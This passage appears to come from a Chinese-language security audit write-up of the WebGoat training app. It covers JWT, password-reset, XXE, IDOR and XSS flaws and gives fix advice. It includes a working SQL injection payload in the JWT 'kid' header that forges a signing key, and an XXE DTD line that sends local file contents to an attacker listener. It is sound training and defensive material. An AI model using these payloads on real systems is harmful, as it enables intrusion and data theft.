&lt;p&gt;登录时调用 createNewTokens ()&lt;/p&gt;
&lt;p&gt;会获取到的 refresh token 和该用户的 access token&lt;/p&gt;
&lt;p&gt;refresh token 是通过 RandomStringUtils.randomAlphabetic (20) 获取的随机值，用于刷新过期的 access token&lt;/p&gt;
&lt;p&gt;但是由于没有绑定用户信息，所以可以用来刷新任何任何用户的过期 token&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Map&amp;lt;String, Object&amp;gt; tokenJson = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;&amp;gt;();        String refreshToken = RandomStringUtils.randomAlphabetic(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;);        validRefreshTokens.add(refreshToken);        tokenJson.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;access_token&amp;quot;&lt;/span&gt;, token);        tokenJson.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;refresh_token&amp;quot;&lt;/span&gt;, refreshToken);        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; tokenJson;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;token 刷新，请求包中的 refresh_token 被包含在随机生成的 token 集合中时，就返回一个新的 token：&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (user == &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt; || refreshToken == &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;) &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (validRefreshTokens.contains(refreshToken)) &amp;#123;            validRefreshTokens.remove(refreshToken);            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ok(createNewTokens(user));        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;利用登录接口，登录当前用户 jerry，获取刷新 refresh_token&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt14.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;没有成功刷新 token，报错信息：给出的 token 无法正常解析&lt;/p&gt;
&lt;p&gt;jwt–&amp;gt;JWTFinalEndpoint.resetVotes()&lt;/p&gt;
&lt;p&gt;存在 sql 注入点 &amp;quot;kid&amp;quot;(KID 代表 “密钥序号”（Key ID）。它是 JWT 头部的一个可选字段，开发人员可以用它标识认证 token 的某一密钥)&lt;/p&gt;
&lt;p&gt;可以通过 union 进行绕过，将 &amp;quot;key&amp;quot; 作为认证密钥，使用&lt;a href=&#34;https://jwt.io/#debugger&#34;&gt;在线工具&lt;/a&gt;伪造 token&lt;/p&gt;
&lt;p&gt;这里将数据库取出的 key 用 base64 解码了，所以在注入的时候要注入 key 的 base 编码&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;aaa&lt;span class=&#34;string&#34;&gt;&amp;#x27; union select &amp;#x27;&lt;/span&gt;a2V5&lt;span class=&#34;string&#34;&gt;&amp;#x27; from jwt_keys where id=&amp;#x27;&lt;/span&gt;webgoat_key&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String kid = (String) header.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;kid&amp;quot;&lt;/span&gt;);                        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; connection = dataSource.getConnection()) &amp;#123;                            ResultSet rs = connection.createStatement().executeQuery(&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT key FROM jwt_keys WHERE id = &amp;#x27;&amp;quot;&lt;/span&gt; + kid + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27;&amp;quot;&lt;/span&gt;);                            &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (rs.next()) &amp;#123;                                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; TextCodec.BASE64.decode(rs.getString(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));                            &amp;#125;                        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;建议&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;保证密钥的保密性&lt;/li&gt;
&lt;li&gt;签名算法固定在后端，不以 JWT 里的算法为标准&lt;/li&gt;
&lt;li&gt;避免敏感信息保存在 JWT 中&lt;/li&gt;
&lt;li&gt;尽量 JWT 的有效时间足够短&lt;/li&gt;
&lt;li&gt;尽量避免用用户可以获取的参数刷新 token，避免逻辑绕过&lt;/li&gt;
&lt;li&gt;注意 header 部分，若有 sql 语句，建议使用预编译&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;a2v5 是 key 的 base64 编码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt15.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;安全问题&lt;/p&gt;
&lt;p&gt;password_reset–&amp;gt;QuestionsAssignment&lt;/p&gt;
&lt;p&gt;密保问题设置为，你最喜欢的颜色是什么，可以直接用常见颜色生成字典进行爆破，建议使用更复杂的难以破解的问题，并且限制输入次数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;ba01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt17.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;password_reset–&amp;gt;ResetLinkAssignmentForgotPassword&lt;/p&gt;
&lt;p&gt;参数 host 是从 Request 头部获取的，可以通过控制 host 参数，给用户发送一个我们控制的 link，用户点击后访问我们的服务器，服务器记录该请求，从而获取到后面的 resetLink，然后我们再通过正常的访问修改密码&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;修复建议：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 禁止将用户可控的参数拼接进密码重置link2. 重置链接应该是一次性有效的
&lt;/code&gt;&lt;/pre&gt;
   &lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;fakeClickingLinkEmail&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String host, String resetLink)&lt;/span&gt; &lt;/span&gt;&amp;#123;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;            HttpHeaders httpHeaders = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HttpHeaders();            HttpEntity httpEntity = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HttpEntity(httpHeaders);            &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; RestTemplate().exchange(String.format(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://%s/PasswordReset/reset/reset-password/%s&amp;quot;&lt;/span&gt;, host, resetLink), HttpMethod.GET, httpEntity, Void.class);        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (Exception e) &amp;#123;         &lt;span class=&#34;comment&#34;&gt;//don&amp;#x27;t care        &amp;#125;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;攻击者服务器记录了请求&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt18.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;用户敏感信息传输与存储&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户敏感信息传输与存储&#34;&gt;#&lt;/a&gt; 用户敏感信息传输与存储&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-5&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;系统未对用户的敏感信息（如密码、身份证号、电话号码、银行卡号等）进行加密、脱敏等操作，导致用户信息存在泄露的风险。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-5&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;提交登录请求时，没有对密码进行加密&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-5&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;p&gt;前端存储的用户名和密码&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;submit_secret_credentials&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; xhttp = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; XMLHttpRequest();    xhttp[&lt;span class=&#34;string&#34;&gt;&amp;#x27;open&amp;#x27;&lt;/span&gt;](&lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;#attack/307/100&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);	&lt;span class=&#34;comment&#34;&gt;//sending the request is obfuscated, to descourage js reading	var _0xb7f9=[&amp;quot;\x43\x61\x70\x74\x61\x69\x6E\x4A\x61\x63\x6B&amp;quot;,&amp;quot;\x42\x6C\x61\x63\x6B\x50\x65\x61\x72\x6C&amp;quot;,&amp;quot;\x73\x74\x72\x69\x6E\x67\x69\x66\x79&amp;quot;,&amp;quot;\x73\x65\x6E\x64&amp;quot;];xhttp[_0xb7f9[3]](JSON[_0xb7f9[2]](&amp;#123;username:_0xb7f9[0],password:_0xb7f9[1]&amp;#125;))&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;调用该函数的发包截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;se01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;建议在数据传过程中，对用户的敏感数据进行加密&lt;/p&gt;
&lt;h1 id=&#34;xml外部实体注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xml外部实体注入&#34;&gt;#&lt;/a&gt; XML 外部实体注入&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-6&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;XXE（XML External Entity Injection）是一种针对 XML 终端实施的攻击，漏洞产生的根本原因就是在 XML1.0 标准中引入了 “entity” 这个概念，且 “entity” 可以在预定义的文档中进行调用，XXE 漏洞的利用就是通过实体的标识符访问本地或者远程内容。黑客想要实施这种攻击，需要在 XML 的 payload 包含外部实体声明，且服务器本身允许实体扩展。这样的话，黑客或许能读取 WEB 服务器的文件系统，通过 UNC 路径访问远程文件系统，或者通过 HTTP/HTTPS 连接到任意主机。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-6&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;XML 解析没有禁止外部实体的解析，且用户可控 REST XML 格式的参数。&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-6&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;xxe–&amp;gt;SimpleXXE.createNewComment()&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;boolean&lt;/span&gt; secure = &lt;span class=&#34;keyword&#34;&gt;false&lt;/span&gt;;     	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt; != request.getSession().getAttribute(&lt;span class=&#34;string&#34;&gt;&amp;quot;applySecurity&amp;quot;&lt;/span&gt;)) &amp;#123;     		secure = &lt;span class=&#34;keyword&#34;&gt;true&lt;/span&gt;;     	&amp;#125;         Comment comment = comments.parseXml(commentStr, secure);         comments.addComment(comment, &lt;span class=&#34;keyword&#34;&gt;false&lt;/span&gt;);         &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (checkSolution(comment)) &amp;#123;             &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; success(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).build();         &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中调用 Comment 的 parseXml (commentStr, secure) 方法进行 xml 解析&lt;br&gt;
正如代码中所示，可以通过设置 XMLConstants 的两个属性来禁用外部实体解析，默认的空字符串就是禁用，也可以指定协议等。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;详细信息可以看 XMLConstants 中的注释。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; jc = JAXBContext.newInstance(Comment.class);     &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; xif = XMLInputFactory.newInstance();   &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (secure) &amp;#123;        	xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// Compliant     	xif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &amp;quot;&amp;quot;);  // compliant        &amp;#125;                   var xsr = xif.createXMLStreamReader(new StringReader(xml));            var unmarshaller = jc.createUnmarshaller();        return (Comment) unmarshaller.unmarshal(xsr);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;xxe01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;xxe–&amp;gt;ContentTypeAssignment.createNewUser()&lt;/p&gt;
&lt;p&gt;根据 contentType 判断数据格式，xml 解析和 1 一样，其余同上&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 如果是xml格式        if (null != contentType &amp;amp;&amp;amp; contentType.contains(MediaType.APPLICATION_XML_VALUE)) &amp;#123;            String error = &amp;quot;&amp;quot;;            try &amp;#123;            	boolean secure = false;            	if (null != request.getSession().getAttribute(&amp;quot;applySecurity&amp;quot;)) &amp;#123;            		secure = true;            	&amp;#125;                Comment comment = comments.parseXml(commentStr, secure);                comments.addComment(comment, false);                if (checkSolution(comment)) &amp;#123;                    attackResult = success(this).build();                &amp;#125;            &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;xxe02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;xxe03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;xxe–&amp;gt;ContentTypeAssignment.addComment()&lt;/p&gt;
&lt;p&gt;这里作者为了弄一个 blind xxe，特别设置了提交正确的内容才返回 success&lt;/p&gt;
&lt;p&gt;xml 解析代码并没有改变&lt;/p&gt;
&lt;p&gt;实际上还是通过参数实体注入（参数实体也能被外部引用），为了看到数据所以要通过盲打的方式，将 WEB 服务器的本地文件内容发送到攻击者的服务器&lt;/p&gt;
&lt;p&gt;修复建议同上&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Solution is posted as a separate comment        if (commentStr.contains(CONTENTS)) &amp;#123;            return success(this).build();        &amp;#125;        try &amp;#123;        	boolean secure = false;        	if (null != request.getSession().getAttribute(&amp;quot;applySecurity&amp;quot;)) &amp;#123;        		secure = true;        	&amp;#125;            Comment comment = comments.parseXml(commentStr, secure);            if (CONTENTS.contains(comment.getText())) &amp;#123;                comment.setText(&amp;quot;Nice try, you need to send the file to WebWolf&amp;quot;);            &amp;#125;            comments.addComment(comment, false);        &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;a.dtd 上传在攻击服务器上&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY % payload  &amp;quot;&amp;lt;!ENTITY attack SYSTEM &amp;#x27;http://127.0.0.1:9090/landing?text=%file;&amp;#x27;&amp;gt;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;xxe04.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;数据通过实体引用成功回显啦&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;xxe05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;水平越权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#水平越权&#34;&gt;#&lt;/a&gt; 水平越权&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-7&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;水平越权漏洞，是一种 “基于数据的访问控制” 设计缺陷引起的漏洞。由于服务器端在接收到请求数据进行操作时，没有判断数据的所属人，而导致的越权数据访问漏洞。如服务器端从客户端提交的 request 参数（用户可控数据）中获取用户 id，恶意攻击者通过变换请求 ID 的值，查看或修改不属于本人的数据。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-7&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;服务器端对数据的访问控制验证不充分&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-7&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;p&gt;idor–&amp;gt;IDORViewOtherProfile&lt;/p&gt;
&lt;p&gt;安全代码将确保在拆除所请求的配置文件之前确保有一个水平访问控制检查&lt;/p&gt;
&lt;p&gt;例如检查登录用户的 session 中的 id（用户不可控）是否和请求的 id 一致&lt;/p&gt;
&lt;p&gt;if(requestedProfile.getUserId().equals(authUserId))&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (userSessionData.getValue(&lt;span class=&#34;string&#34;&gt;&amp;quot;idor-authenticated-as&amp;quot;&lt;/span&gt;).equals(&lt;span class=&#34;string&#34;&gt;&amp;quot;tom&amp;quot;&lt;/span&gt;)) &amp;#123;            &lt;span class=&#34;comment&#34;&gt;//going to use session auth to view this one            String authUserId = (String) userSessionData.getValue(&amp;quot;idor-authenticated-user-id&amp;quot;);            if (userId != null &amp;amp;&amp;amp; !userId.equals(authUserId)) &amp;#123;                //on the right track                UserProfile requestedProfile = new UserProfile(userId);                // secure code would ensure there was a horizontal access control check prior to dishing up the requested profile                 if (requestedProfile.getUserId().equals(&amp;quot;2342388&amp;quot;)) &amp;#123;                    return success(this).feedback(&amp;quot;idor.view.profile.success&amp;quot;).output(requestedProfile.profileToMap().toString()).build();                &amp;#125; else &amp;#123;                    return failed(this).feedback(&amp;quot;idor.view.profile.close1&amp;quot;).build();                &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;yq01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;xss跨站脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss跨站脚本&#34;&gt;#&lt;/a&gt; XSS 跨站脚本&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-8&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;跨站脚本攻击（Cross Site Script）是一种将恶意 JavaScript 代码插入到其他 Web 用户页面里执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在 HTML 页面里嵌入恶意代码。当用户浏览该页时，这些嵌入在 HTML 中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie 窃取、帐户劫持、拒绝服务攻击等。&lt;/p&gt;
&lt;p&gt;跨站脚本攻击有以下攻击形式：&lt;/p&gt;
&lt;p&gt;1、反射型跨站脚本攻击&lt;/p&gt;
&lt;p&gt;攻击者利用社会工程学等手段，发送一个 URL 链接给用户打开，在用户打开页面的同时，浏览器会执行页面中嵌入的恶意脚本。&lt;/p&gt;
&lt;p&gt;2、存储型跨站脚本攻击&lt;/p&gt;
&lt;p&gt;攻击者利用应用程序提供的录入或修改数据的功能，将数据存储到服务器或用户 cookie 中，当其他用户浏览展示该数据的页面时，浏览器会执行页面中嵌入的恶意脚本，所有浏览者都会受到攻击。&lt;/p&gt;
&lt;p&gt;3、DOM 跨站脚本攻击&lt;/p&gt;
&lt;p&gt;由于 HTML 页面中，定义了一段 JS，根据用户的输入，显示一段 HTML 代码，攻击者可以在输入时，插入一段恶意脚本，最终展示时，会执行恶意脚本。&lt;/p&gt;
&lt;p&gt;DOM 跨站脚本攻击和以上两个跨站脚本攻击的区别是，DOM 跨站是纯页面脚本的输出，只有规范使用 JavaScript，才可以防御。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-8&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;在 HTML 中常用到字符实体，将常用到的字符实体没有进行转译，导致完整的标签出现，在可输入的文本框等某些区域内输入特定的某些标签导致代码被恶意篡改。&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-8&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;xss–&amp;gt;CrossSiteScriptingLesson5a&lt;/p&gt;
&lt;p&gt;反射型 xss&lt;/p&gt;
&lt;p&gt;题目用正则表达式匹配用户输入的参数 field1，因为是题目需求这里匹配 &amp;quot;.*&amp;lt;script&amp;gt;(console\.log|alert)\(.&lt;em&gt;\);?&amp;lt;\/script&amp;gt;.&lt;/em&gt;&amp;quot; 后在页面上进行输出&lt;/p&gt;
